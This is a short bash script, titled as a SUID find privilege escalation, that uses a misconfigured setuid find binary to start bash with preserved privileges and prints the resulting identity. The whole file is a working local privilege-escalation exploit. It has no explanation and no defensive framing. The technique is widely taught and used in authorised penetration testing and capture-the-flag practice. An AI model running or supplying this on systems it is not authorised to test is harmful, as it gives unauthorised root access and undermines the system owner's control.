#!/bin/bash
# SUID find privilege escalation
set -euo pipefail
find / -maxdepth 0 -exec /bin/bash -p -c 'id && whoami' \;
